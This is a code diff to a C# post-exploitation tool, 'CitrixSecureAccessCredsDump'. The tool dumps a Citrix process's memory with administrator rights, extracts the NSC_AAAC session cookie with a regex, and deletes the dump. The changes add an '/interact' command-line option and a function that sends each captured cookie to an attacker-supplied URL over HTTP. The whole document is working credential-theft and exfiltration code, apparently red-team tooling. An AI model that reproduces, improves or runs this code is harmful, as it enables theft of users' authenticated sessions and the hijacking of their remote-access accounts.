@@ -2,12 +2,12 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
 using System.Runtime.InteropServices;
 using System.IO;
 using System.Diagnostics;
 using System.Security.Principal;
 using System.Text.RegularExpressions;
+using System.Net;
 
 namespace CitrixSecureAccessCredsDump
 {
@@ -32,7 +32,7 @@ namespace CitrixSecureAccessCredsDump
             public const int MiniDumpWithThreadInfo = 0x00001000;
             public const int MiniDumpWithCodeSegs = 0x00002000;
         }
-
+        private static string InteractUrl = string.Empty;
 
         [DllImport("dbghelp.dll", SetLastError = true)]
         static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);
@@ -58,6 +58,21 @@ namespace CitrixSecureAccessCredsDump
         [Obsolete] // but we don't care
         static void Main(string[] args)
         {
+
+            var arguments = new Dictionary<string, string>();
+            foreach (var argument in args)
+            {
+                var idx = argument.IndexOf(':');
+                if (idx > 0)
+                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
+                else
+                    arguments[argument] = string.Empty;
+            }
+            if (arguments.ContainsKey("/interact"))
+            {
+                InteractUrl = arguments["/interact"];
+            }
+
             WindowsIdentity identity = WindowsIdentity.GetCurrent();
             WindowsPrincipal principal = new WindowsPrincipal(identity);
             if (principal.IsInRole(WindowsBuiltInRole.Administrator))
@@ -136,6 +151,10 @@ namespace CitrixSecureAccessCredsDump
                 if (rg.Match(s).Success)
                 {
                     Console.WriteLine($"[+] Auth Cookie found : NSC_AAAC={s}");
+                    if (!string.IsNullOrEmpty(string.Concat(InteractUrl)))
+                    {
+                        SendToInteractUrl(string.Concat(InteractUrl, $"?NSC_AAAC={s}"));
+                    }
                     break;
                 }
                 else
@@ -151,6 +170,19 @@ namespace CitrixSecureAccessCredsDump
             Clean(dumpPath);
         }
 
+        private static void SendToInteractUrl(string cookie)
+        {
+            try
+            {
+                WebRequest.Create(cookie).GetResponse();
+                Console.WriteLine($"[+] Cookie transfered to interact url");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[-] Something went wrong. {ex.Message}");
+            }
+
+        }
         private static void Clean(string dumpPath)
         {
             try
